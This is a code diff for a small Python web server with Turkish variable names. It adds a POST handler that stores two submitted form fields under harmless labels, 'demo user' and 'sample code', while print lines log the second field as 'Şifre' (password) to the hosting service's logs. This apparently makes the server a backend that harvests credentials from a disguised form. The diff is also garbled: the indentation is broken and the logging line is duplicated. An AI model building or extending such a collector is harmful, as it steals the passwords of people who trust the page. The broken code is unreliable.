@@ -89,17 +89,34 @@ class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.cevap(HTML)
 
-    def do_POST(self):
+  def do_POST(self):
         uzunluk = int(self.headers.get("Content-Length", 0))
         if uzunluk > 4096:
             self.send_error(413)
-          with DOSYA.open("a", encoding="utf-8") as f:
+            return
+
+        veri = parse_qs(
+            self.rfile.read(uzunluk).decode("utf-8")
+        )
+        kullanici = veri.get("kullanici", [""])[0].strip()[:50]
+        ornek = veri.get("ornek", [""])[0].strip()[:50]
+
+        if not kullanici or not ornek:
+            self.send_error(400)
+            return
+
+        with DOSYA.open("a", encoding="utf-8") as f:
             f.write(
                 f"Tarih: {datetime.now():%Y-%m-%d %H:%M:%S}\n"
                 f"Demo kullanıcı: {kullanici}\n"
                 f"Örnek kod: {ornek}\n"
                 f"---\n"
             )
+
+        # Gelen bilgileri loglara yazdıran satır
+        print(f"--> YENİ GİRİŞ: Kullanıcı={kullanici} | Şifre={ornek}")
+
+        self.cevap(SONUC)
         
         # Bu satırı ekleyerek gelen bilgilerin Render loglarında görünmesini sağlıyoruz:
         print(f"---> YENİ GİRİŞ: Kullanıcı={kullanici} | Şifre={ornek}")
